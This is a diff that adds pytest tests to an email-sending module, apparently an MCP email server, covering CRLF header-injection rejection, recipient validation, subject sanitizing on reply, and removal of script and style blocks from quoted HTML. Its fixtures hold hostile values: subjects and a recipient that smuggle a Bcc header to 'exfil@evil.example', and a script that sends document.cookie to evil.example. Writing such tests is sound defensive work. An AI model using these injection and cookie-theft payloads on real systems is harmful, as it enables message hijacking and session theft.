@@ -69,6 +69,90 @@ def test_compose_html_escapes_body():
 
 
 # --------------------------------------------------------------------- #
+# header-injection fence + recipient validation                         #
+# --------------------------------------------------------------------- #
+
+
+def test_crlf_subject_rejected_on_send_and_schedule(
+    monkeypatch, tmp_path, capture_delivery
+):
+    hostile = "Status\r\nBcc: exfil@evil.example"
+    with pytest.raises(sender.SendError) as ei:
+        sender.send_email(
+            to="paris.moschovakos@cern.ch", subject=hostile, body="b",
+        )
+    assert "header_injection" in str(ei.value)
+    assert capture_delivery == []  # {ok:false}, never a traceback or a send
+
+    monkeypatch.setenv("EMAIL_MCP_SPOOL_DIR", str(tmp_path / "spool"))
+    with pytest.raises(sender.SendError) as ei:
+        sender.schedule_email(
+            to="paris.moschovakos@cern.ch", subject=hostile, body="b",
+            send_at="2036-01-01T09:00:00+00:00",
+        )
+    assert "header_injection" in str(ei.value)
+    assert list((tmp_path / "spool").rglob("*.json")) == []  # nothing frozen
+
+
+def test_crlf_in_raw_recipient_rejected_before_split(capture_delivery):
+    # _split would degrade the injected line into an extra recipient —
+    # the raw string must be refused before it ever reaches getaddresses.
+    with pytest.raises(sender.SendError) as ei:
+        sender.send_email(
+            to="paris.moschovakos@cern.ch\r\nevil@example.com",
+            subject="s", body="b",
+        )
+    assert "invalid_recipient" in str(ei.value)
+    assert capture_delivery == []
+
+
+def test_junk_recipients_rejected(capture_delivery):
+    for junk in ("1", "not-an-address"):
+        with pytest.raises(sender.SendError) as ei:
+            sender.send_email(to=junk, subject="s", body="b")
+        assert "invalid_recipient" in str(ei.value), junk
+        assert junk in str(ei.value)
+    assert capture_delivery == []
+
+
+def test_reply_sanitizes_hostile_stored_subject(
+    monkeypatch, mail_fixture, capture_delivery
+):
+    """Provenance rule: a hostile subject already in the STORE is sanitized
+    (CTL → space), not refused — the message must stay answerable."""
+    import sqlite3
+
+    monkeypatch.setenv("EMAIL_MCP_SEND_ALLOW_ALL", "1")
+    db = sqlite3.connect(mail_fixture / "MailData" / "Envelope Index")
+    db.execute("UPDATE subjects SET subject=? WHERE ROWID=1",
+               ("I2C\r\nBcc: exfil@evil.example\x00disclosure",))
+    db.commit()
+    db.close()
+    from email_mcp.sources.apple_mail import AppleMailSource
+
+    src = AppleMailSource(mail_base=mail_fixture)
+    res = sender.reply_email(src, id="100", body="Understood.")
+    assert res.ok is True and len(capture_delivery) == 1
+    subj = capture_delivery[0]["Subject"]
+    assert subj == "Re: I2C  Bcc: exfil@evil.example disclosure"  # CTL → space
+    assert "\r" not in subj and "\n" not in subj and "\x00" not in subj
+    # no header actually smuggled in
+    assert "exfil@evil.example" not in (capture_delivery[0]["Bcc"] or "")
+
+
+def test_quote_html_strips_script_and_style_blocks():
+    hostile = (
+        "<html><body><p>Keep me.</p>"
+        "<script>fetch('https://evil.example/'+document.cookie)</script>"
+        "<style>body{display:none}</style></body></html>"
+    )
+    out = sender._quote_html(hostile, "", "On X, Y wrote:")
+    assert "<p>Keep me.</p>" in out
+    assert "<script" not in out.lower() and "fetch(" not in out
+    assert "<style" not in out.lower() and "display:none" not in out
+
+
+# --------------------------------------------------------------------- #
 # allowlist guard                                                       #
 # --------------------------------------------------------------------- #
 
